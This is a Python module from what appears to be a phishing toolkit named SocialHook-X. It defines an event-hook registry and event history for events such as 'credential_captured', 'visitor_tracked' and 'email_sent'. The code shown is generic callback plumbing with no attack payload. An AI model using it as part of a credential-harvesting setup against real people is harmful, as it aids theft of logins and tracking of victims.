"""
SocialHook-X - Event Hooks Module

Provides event hook system for credential capture, visitor tracking, and custom events.
"""

import logging
from typing import Callable, Dict, List
from dataclasses import dataclass
from datetime import datetime

logger = logging.getLogger(__name__)


@dataclass
class Event:
    """Represents an event"""
    name: str
    data: Dict
    timestamp: datetime = None
    
    def __post_init__(self):
        if self.timestamp is None:
            self.timestamp = datetime.now()


class EventHooks:
    """Event hooks manager for custom callbacks"""
    
    def __init__(self):
        """Initialize event hooks"""
        self.hooks: Dict[str, List[Callable]] = {
            "credential_captured": [],
            "visitor_tracked": [],
            "email_sent": [],
            "error_occurred": [],
            "report_generated": [],
            "geolocation_lookup": [],
            "server_started": [],
            "server_stopped": [],
        }
        self.event_history: List[Event] = []
        self.max_history = 1000
    
    def register(self, event_name: str, callback: Callable) -> bool:
        """Register callback for event
        
        Args:
            event_name: Event name
            callback: Callback function
        
        Returns:
            True if registered, False otherwise
        """
        if event_name not in self.hooks:
            logger.warning(f"Unknown event: {event_name}")
            return False
        
        self.hooks[event_name].append(callback)
        logger.info(f"Registered callback for event: {event_name}")
        return True
    
    def unregister(self, event_name: str, callback: Callable) -> bool:
        """Unregister callback for event
        
        Args:
            event_name: Event name
            callback: Callback function
        
        Returns:
            True if unregistered, False otherwise
        """
        if event_name not in self.hooks:
            return False
        
        try:
            self.hooks[event_name].remove(callback)
            logger.info(f"Unregistered callback for event: {event_name}")
            return True
        except ValueError:
            return False
    
    def trigger(self, event_name: str, data: Dict = None) -> int:
        """Trigger event callbacks
        
        Args:
            event_name: Event name
            data: Event data
        
        Returns:
            Number of callbacks executed
        """
        if data is None:
            data = {}
        
        if event_name not in self.hooks:
            logger.warning(f"Unknown event: {event_name}")
            return 0
        
        # Store in history
        event = Event(name=event_name, data=data)
        self.event_history.append(event)
        if len(self.event_history) > self.max_history:
            self.event_history.pop(0)
        
        # Execute callbacks
        count = 0
        for callback in self.hooks[event_name]:
            try:
                callback(data)
                count += 1
            except Exception as e:
                logger.error(f"Error in hook callback: {e}")
        
        logger.debug(f"Triggered event '{event_name}' with {count} callbacks")
        return count
    
    def get_callbacks(self, event_name: str) -> List[Callable]:
        """Get registered callbacks for event
        
        Args:
            event_name: Event name
        
        Returns:
            List of callbacks
        """
        return self.hooks.get(event_name, [])
    
    def get_event_history(self, event_name: str = None) -> List[Event]:
        """Get event history
        
        Args:
            event_name: Optional event name to filter
        
        Returns:
            List of events
        """
        if event_name is None:
            return self.event_history.copy()
        
        return [e for e in self.event_history if e.name == event_name]
    
    def clear_history(self) -> int:
        """Clear event history
        
        Returns:
            Number of events cleared
        """
        count = len(self.event_history)
        self.event_history.clear()
        logger.info(f"Cleared {count} events from history")
        return count
    
    def get_stats(self) -> Dict:
        """Get hooks statistics
        
        Returns:
            Statistics dictionary
        """
        return {
            "total_hooks": sum(len(cbs) for cbs in self.hooks.values()),
            "event_types": len(self.hooks),
            "history_size": len(self.event_history),
            "events_by_type": {
                name: len([e for e in self.event_history if e.name == name])
                for name in self.hooks.keys()
            }
        }


# Global event hooks instance
_event_hooks = None


def get_event_hooks() -> EventHooks:
    """Get or create event hooks instance
    
    Returns:
        EventHooks instance
    """
    global _event_hooks
    if _event_hooks is None:
        _event_hooks = EventHooks()
    return _event_hooks
